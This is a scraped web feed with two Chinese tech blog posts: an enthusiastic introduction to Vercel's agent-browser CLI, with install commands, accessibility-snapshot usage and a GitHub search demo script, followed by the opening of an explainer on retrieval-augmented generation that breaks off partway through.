            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/184373682644119/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    Delroy
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2026-01-14T06:51:20.000Z" title="Wed Jan 14 2026 06:51:20 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2026-01-14
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    阅读6分钟
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><h2 data-id="heading-0">Vercel 凌晨突发：agent-browser 来了，减少 93% 上下文！AI 终于有了“操纵现实”的手！ 🚀</h2>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/fa1b748ed4c946acb7d9f049907890d5~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgRGVscm95:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768978280&amp;x-signature=CK19ntBZl8UfWxfEbghtM6ipNDw%3D" alt="vercel_agent_cover.jpg" loading="lazy"/></p>
<blockquote>
<p><strong>导语</strong>：在 AI 领域，我们正处于一个尴尬的过渡期：AI 拥有了“最强大脑”，却依然是一等残废——它能教你如何订票，却无法帮你按下那个“提交”按钮。</p>
<p>2026 年 1 月，Vercel Labs 终于向这个痛点开火了。他们正式发布了 <strong><code>agent-browser</code></strong>，一个专为 AI Agent 设计的浏览器自动化 CLI。它不仅给 AI 装上了“手”，更可怕的是，它通过黑科技将浏览器操作的上下文占用减少了 <strong>93%</strong>。</p>
<p>别再让你的 AI 在 HTML 的汪洋大海里“溺水”了，今天我们就来深度拆解这个可能改变 Agent 游戏规则的神器。</p>
</blockquote>
<hr/>
<h3 data-id="heading-1">一、 为什么我们要关注 <code>agent-browser</code>？</h3>
<p>长期以来，让 AI 自动化操作浏览器一直是开发者的噩梦。</p>
<p>如果你尝试过用传统的 Playwright 或 Puppeteer 对接大模型（LLM），你一定遇到过这些问题：</p>
<ol>
<li><strong>Token 爆炸</strong>：一个普通的网页 HTML 动辄几万行，喂给 AI 直接就把上下文撑爆了，费用贵得离谱。</li>
<li><strong>AI 的“老花眼”</strong>：面对复杂的 DOM 树，AI 经常找错按钮，或者在嵌套的 <code>&lt;div&gt;</code> 里迷失自我。</li>
<li><strong>环境复杂</strong>：配置 Headless 浏览器、驱动、依赖，还没开始写逻辑，环境就配了两小时。</li>
</ol>
<p>Vercel 的 <code>agent-browser</code> 正是为此而生。它不是给人类用的浏览器，它是给 <strong>AI Agent 专用</strong> 的交互协议。</p>
<hr/>
<h3 data-id="heading-2">二、 快速安装：一分钟开启“上帝模式”</h3>
<p>Vercel 保持了一贯的“零配置”风格。你只需要一行命令：</p>
<pre><code class="hljs language-bash" lang="bash"><span class="hljs-comment"># 使用 npm 全局安装</span>
npm install -g agent-browser

<span class="hljs-comment"># 下载必要的浏览器二进制文件（Chromium）</span>
agent-browser install
</code></pre>
<p>如果你是在 Linux 服务器（如 Ubuntu）上运行，它甚至贴心地准备了依赖自动安装：</p>
<pre><code class="hljs language-bash" lang="bash">agent-browser install --with-deps
</code></pre>
<p>安装完成后，你的 AI 助手就拥有了调用浏览器的底层能力。</p>
<hr/>
<h3 data-id="heading-3">三、 核心原理：93% 上下文压缩的奥秘 🧠</h3>
<p>这是全篇最硬核的部分。为什么 <code>agent-browser</code> 能让 AI 变得如此高效？</p>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/2e89dc1274eb4094a6a51dfc9edbe2b5~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgRGVscm95:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768978280&amp;x-signature=x43RWdSN1x5LlIkvnWiRAqT%2BldI%3D" alt="token_reduction.jpg" loading="lazy"/></p>
<h4 data-id="heading-4">3.1 从 DOM 到 AOM 的降维打击</h4>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/83632c3c2cc8498bbbe111596725d4be~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgRGVscm95:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768978280&amp;x-signature=qFy%2FDaiXkQRqX3jIspmeiV2CuSg%3D" alt="dom_vs_aom.jpg" loading="lazy"/></p>
<p>传统的工具会将整个 <strong>DOM (Document Object Model)</strong> 发给 AI，里面充满了大量的样式、脚本和冗余节点。</p>
<p>而 <code>agent-browser</code> 选择了 <strong>AOM (Accessibility Object Model)</strong>，即无障碍对象模型。</p>
<pre><code class="hljs language-mermaid" lang="mermaid">graph TD
    A[原始网页] --&gt;|传统方案| B(完整 DOM 树)
    A --&gt;|agent-browser| C(无障碍树 AOM)
    B --&gt;|冗余信息多| D[AI 陷入 Token 泥潭]
    C --&gt;|只有核心语义| E[AI 精准锁定目标]
    E --&gt;|效率提升| F[减少 93% 上下文]
</code></pre>
<p><strong>原理拆解：</strong></p>
<ul>
<li><strong>过滤噪声</strong>：它剔除了所有对交互无用的 CSS 和视觉修饰。</li>
<li><strong>语义化提炼</strong>：它只告诉 AI 哪里是按钮（button）、哪里是输入框（textbox）、哪里是链接（link）。</li>
<li><strong>结构压缩</strong>：通过 <code>-i</code> (Interactive) 模式，它甚至可以只显示可交互元素，将原本几百 KB 的 HTML 压缩到几 KB。</li>
</ul>
<h4 data-id="heading-5">3.2 创新的 Ref 系统</h4>
<p>这是最让开发者高呼“优雅”的设计。在获取网页快照（Snapshot）时，<code>agent-browser</code> 会自动为每个元素分配一个临时的“身份证”——<strong>Ref</strong>。</p>
<p><strong>示例：</strong></p>
<ul>
<li><code>[ref=e1]</code> 代表登录按钮</li>
<li><code>[ref=e2]</code> 代表用户名输入框</li>
</ul>
<p>AI 不需要再写复杂的 <code>xpath</code> 或 <code>css selector</code>，它只需要说：<code>click @e1</code>。这种<strong>确定性</strong>的操作直接消灭了 AI 误操作的可能。</p>
<h4 data-id="heading-6">3.3 Rust + Node.js 混血架构</h4>
<p>为了追求极致的速度，<code>agent-browser</code> 采用了双引擎设计。根据 GitHub 仓库的实时代码分布（TypeScript 57.9%, Rust 38.9%），我们可以清晰地看到这种混合架构的特征：</p>
<ul>
<li><strong>前端 CLI (Rust)</strong>：负责指令解析和状态管理，快如闪电。</li>
<li><strong>后端守护进程 (Node.js)</strong>：常驻内存管理 Playwright 实例，避免了每次执行命令都要重新冷启动浏览器的延迟。</li>
</ul>
<hr/>
<h3 data-id="heading-7">四、 实战演习：让 AI 帮我们“查票”</h3>
<p>让我们看看一个真实的 AI 交互工作流。</p>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/16155784ec82477da09a2101b200d00e~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgRGVscm95:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768978280&amp;x-signature=KcYlku4Hz6jAkEHLXFvazMQN04M%3D" alt="agent_hand.jpg" loading="lazy"/></p>
<h4 data-id="heading-8">第一步：打开页面</h4>
<pre><code class="hljs language-bash" lang="bash">agent-browser open https://www.flight-search.com
</code></pre>
<h4 data-id="heading-9">第二步：获取 AI 友好的快照</h4>
<pre><code class="hljs language-bash" lang="bash">agent-browser snapshot -i --json
</code></pre>
<p>此时 AI 会收到一份整洁的 JSON，看到类似这样的内容：</p>
<blockquote>
<p><code>{"ref": "e1", "role": "textbox", "name": "出发地"}</code> &gt; <code>{"ref": "e2", "role": "textbox", "name": "目的地"}</code> &gt; <code>{"ref": "e3", "role": "button", "name": "搜索"}</code></p>
</blockquote>
<h4 data-id="heading-10">第三步：精准操作</h4>
<pre><code class="hljs language-bash" lang="bash">agent-browser fill @e1 <span class="hljs-string">"北京"</span>
agent-browser fill @e2 <span class="hljs-string">"上海"</span>
agent-browser click @e3
</code></pre>
<h4 data-id="heading-11">第四步：截屏验证（可选）</h4>
<pre><code class="hljs language-bash" lang="bash">agent-browser screenshot result.png
</code></pre>
<p>整个过程行云流水，AI 就像真的坐在电脑前操作一样。</p>
<hr/>
<h3 data-id="heading-12">五、 进阶：Authenticated Sessions（跳过登录）</h3>
<p>作为开发者，最讨厌的就是写登录爬虫。<code>agent-browser</code> 支持直接注入 Header：</p>
<pre><code class="hljs language-bash" lang="bash">agent-browser open api.example.com --headers <span class="hljs-string">'{"Authorization": "Bearer your_token"}'</span>
</code></pre>
<p>这意味着你的 AI Agent 可以直接以授权身份进入任何系统，跳过验证码，直接执行高价值任务。</p>
<hr/>
<h3 data-id="heading-13">六、实战彩蛋：用 AI 操控 AI 仓库</h3>
<p>既然我们已经掌握了屠龙技，怎能不试试呢？我为大家写了一个 Shell 脚本，演示如何利用 `agent-browser` 的 <strong>Semantic Locator</strong> 功能，无需分析 DOM，直接用自然语言操作 GitHub 搜索。</p>
<p><strong>你的本地实战步骤：</strong></p>
<ol>
<li>确保已安装工具：<code>npm i -g agent-browser &amp;&amp; agent-browser install</code></li>
<li>复制以下脚本为 <code>demo.sh</code> 并运行。</li>
<li>见证浏览器自动打开并搜索 Vercel 的仓库。</li>
</ol>
<pre><code class="hljs language-bash" lang="bash"><span class="hljs-meta">#!/bin/bash</span>

<span class="hljs-comment"># 先关闭所有 agent-browser 进程</span>
pkill -f agent-browser
<span class="hljs-built_in">sleep</span> 2

<span class="hljs-comment"># 自动搜索 GitHub Demo</span>

<span class="hljs-built_in">echo</span> <span class="hljs-string">"🚀 启动 Agent Browser..."</span>

<span class="hljs-comment"># 1. 打开 GitHub 搜索页</span>
<span class="hljs-comment"># --headed 让我们可以看到浏览器界面</span>
agent-browser <span class="hljs-built_in">set</span> viewport 1280 800
agent-browser open <span class="hljs-string">"https://github.com/search"</span> --headed

<span class="hljs-comment"># 2. 智能填写关键词 (使用稳健的选择器)</span>
<span class="hljs-built_in">echo</span> <span class="hljs-string">"✍️ 正在输入关键词..."</span>
agent-browser fill <span class="hljs-string">"[aria-label='Search GitHub']"</span> <span class="hljs-string">"vercel/agent-browser"</span>

<span class="hljs-comment"># 3. 按回车触发搜索</span>
<span class="hljs-built_in">echo</span> <span class="hljs-string">"🔍 提交搜索..."</span>
agent-browser press <span class="hljs-string">"Enter"</span>

<span class="hljs-built_in">echo</span> <span class="hljs-string">"✅ 搞定！AI 已帮你找到目标仓库。"</span>
</code></pre>
<p>这才是 Agent 的正确打开方式——<strong>像人一样思考，像机器一样执行。</strong></p>
<hr/>
<h3 data-id="heading-14">七、 总结：Vercel 的野心</h3>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/5162ad796e764255b8f6069eb95c1730~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgRGVscm95:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768978280&amp;x-signature=XmpMLr1glbQOiAAp84S%2FlbskTP0%3D" alt="ai_cloud_vision.jpg" loading="lazy"/>
<code>agent-browser</code> 的发布，标志着 Vercel 正在从一个“前端托管平台”转变为“<strong>AI Agent 基础设施提供商</strong>”。项目发布仅两天，GitHub Star 数已突破 <strong>2.8k</strong>，足见开发者社区的关注度。</p>
<p>它通过极致的工具链（Rust CLI）和创新的交互协议（AOM + Ref），彻底解决了 AI 与网页交互的“最后一百米”问题。当上下文占用减少了 93%，原本因为太贵、太慢而无法商用的 Agent 场景，现在全都变得可行了。</p>
<p><strong>代码和环境的关系很重要，但 AI 和现实世界的关系更重要。</strong></p>
<p>准备好给你的 AI 装上这双“操纵现实”的手了吗？</p>
<hr/>
<blockquote>
<p><strong>作者提示</strong>：</p>
<ol>
<li>项目仓库：<code>github.com/vercel-labs/agent-browser</code></li>
<li>建议搭配 Vercel 的 <code>v0</code> 模型使用，效果更佳。</li>
<li>如果本文对你有帮助，请点赞分享！ 😉</li>
</ol>
</blockquote></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[重塑 LLM 的“第二大脑”——RAG 技术原理与核心价值深度解析]]></title>    <link>https://juejin.cn/post/7594801581003571236</link>    <guid>https://juejin.cn/post/7594801581003571236</guid>    <pubDate>2026-01-14T07:04:35.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7594801581003571236" data-draft-id="7594722586732822534" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="重塑 LLM 的“第二大脑”——RAG 技术原理与核心价值深度解析"/> <meta itemprop="keywords" content="后端"/> <meta itemprop="datePublished" content="2026-01-14T07:04:35.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="aibigdata"/> <meta itemprop="url" content="https://juejin.cn/user/3430122687593070"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="掘金"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            重塑 LLM 的“第二大脑”——RAG 技术原理与核心价值深度解析
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/3430122687593070/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    aibigdata
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2026-01-14T07:04:35.000Z" title="Wed Jan 14 2026 07:04:35 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2026-01-14
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    阅读7分钟
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><h2 data-id="heading-0">1. 引言：大模型的“阿喀琉斯之踵”</h2>
<p>自 2023 年生成式 AI 爆发以来，我们见证了 LLM（大语言模型）惊人的通识能力。然而，到了 2026 年的今天，在企业级落地和垂直领域应用中，单纯依赖原生 LLM 的弊端早已显露无疑。</p>
<p>无论模型的参数量 scaling 到多大，它们始终面临着<strong>三大核心痛点</strong>：</p>
<p>1.<strong>幻觉问题（Hallucination）</strong> ：模型在不知道答案时倾向于“一本正经地胡说八道”，这在医疗、法律等严谨场景是不可接受的。</p>
<p>2.<strong>知识时效性（Outdated Knowledge）</strong> ：模型的知识截止于训练数据的时间点。重新训练一个万亿参数的模型既昂贵又耗时，无法做到实时更新。</p>
<p>3.<strong>私有数据黑盒（Private Data Inaccessibility）</strong> ：企业拥有大量的内部文档、SOP、数据库，这些数据是高价值的资产，但通用的 LLM 无法触及，且出于数据安全考虑，企业也不愿将其直接用于公有云模型的微调。</p>
<p>为了解决这些“阿喀琉斯之踵”，<strong>RAG（Retrieval-Augmented Generation，检索增强生成）</strong> 技术应运而生，并迅速成为 AI 2.0 时代企业应用落地的标准架构。</p>
<h2 data-id="heading-1">2. 什么是 RAG？——给大模型一场“开卷考试”</h2>
<h3 data-id="heading-2">2.1 定义与本质</h3>
<p>RAG，全称 Retrieval-Augmented Generation（检索增强生成），是一种将预训练的大语言模型（LLM）与外部知识检索系统相结合的架构。</p>
<p>通俗来说，如果传统的 ChatGPT 问答是“闭卷考试”（完全依赖模型训练时记住的参数知识），那么 <strong>RAG 就是一场“开卷考试”</strong> 。当用户提出问题时，系统首先去外部知识库（课本、参考书）中查找相关资料，然后将这些资料连同问题一起交给大模型，让大模型基于参考资料生成准确的答案。</p>
<p>正如 <a href="https://link.juejin.cn?target=https%3A%2F%2Fwww.redhat.com%2Fzh-cn%2Ftopics%2Fai%2Fwhat-is-retrieval-augmented-generation" target="_blank" title="https://www.redhat.com/zh-cn/topics/ai/what-is-retrieval-augmented-generation" ref="nofollow noopener noreferrer">RedHat</a> 所定义的那样，RAG 是一种能够提高生成式 AI 应用所生成答案的质量和相关性的技术，它的工作原理是将大语言模型的预训练知识与外部资源关联起来。</p>
<h3 data-id="heading-3">2.2 RAG 的核心价值</h3>
<p>根据行业实践经验总结，RAG 技术主要带来了以下价值：</p>
<p>•<strong>准确性提升</strong>：通过引入外部知识库，显著减少了模型的幻觉，利用检索到的事实数据约束模型的生成结果。</p>
<p>•<strong>知识实时性</strong>：无需重新训练模型，只需更新向量数据库中的文档，即可让 AI 掌握最新的新闻、政策或产品信息。</p>
<p>•<strong>数据安全性与隐私</strong>：企业数据保留在本地或私有向量库中，大模型仅作为推理引擎，实现了数据所有权与模型能力的解耦。<a href="https://link.juejin.cn?target=https%3A%2F%2Fwww.cio.com.tw%2Frag-technology-ideal-for-enterprise-knowledge-management-and-the-ideal-combination-of-raw-ai%2F" target="_blank" title="https://www.cio.com.tw/rag-technology-ideal-for-enterprise-knowledge-management-and-the-ideal-combination-of-raw-ai/" ref="nofollow noopener noreferrer">RAG技術：企業知識管理與生成式AI 的理想結合方案</a>。</p>
<p>•<strong>可解释性</strong>：RAG 生成的内容可以标注引用来源（Citation），让用户知道答案出自哪篇文档的哪一段，建立了信任。</p>
<h2 data-id="heading-4">3. RAG 的技术原理与标准流程</h2>
<p>RAG 的标准流程可以概括为三个核心阶段：<strong>索引（Indexing）、检索（Retrieval）和生成（Generation）</strong> 。这是一个实现了“检索”与“生成”有机结合的闭环系统。</p>
<h3 data-id="heading-5">3.1 第一阶段：索引（Indexing）——构建知识库</h3>
<p>这是 RAG 的地基，决定了系统能“看到”什么知识。</p>
<p>1.<strong>数据提取（Data Extraction）</strong> ：从各种来源（PDF、Word、HTML、Markdown、数据库）提取原始文本。</p>
<p>2.<strong>分块（Chunking）</strong> ：由于 LLM 的上下文窗口（Context Window）限制以及检索精度的考量，我们需要将长文本切分为较小的片段（Chunks）。</p>
<p>3.<strong>向量化（Embedding）</strong> ：利用 Embedding 模型将文本块转化为高维向量（Vectors）。向量是计算机理解语义的数学形式。</p>
<p>4.<strong>存储（Indexing/Storage）</strong> ：将生成的向量及对应的元数据存储在 <strong>向量数据库（Vector Database）</strong> 中，如 Milvus、Pinecone、Weaviate 或 Faiss。</p>
<h3 data-id="heading-6">3.2 第二阶段：检索（Retrieval）——寻找相关信息</h3>
<p>当用户发起提问时，系统执行检索操作：</p>
<p>1.<strong>查询向量化</strong>：将用户的 Query 使用同样的 Embedding 模型转化为查询向量 q。</p>
<p>2.<strong>相似度计算</strong>：在向量数据库中计算 q与存储的文档向量 di之间的相似度。最常用的度量方式是 <strong>余弦相似度（Cosine Similarity）</strong> 。 其数学公式如下：</p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/238d5289e3674e1595e1261627e0026b~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgYWliaWdkYXRh:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768979075&amp;x-signature=a87Q38lkuYYxBhq3MErxPq1ZjKU%3D" alt="" loading="lazy"/></p>
<p>1.<strong>Top-K 召回</strong>：根据相似度得分，检索出最相关的 K个文本块（Context）。</p>
<h3 data-id="heading-7">3.3 第三阶段：生成（Generation）——智慧融合</h3>
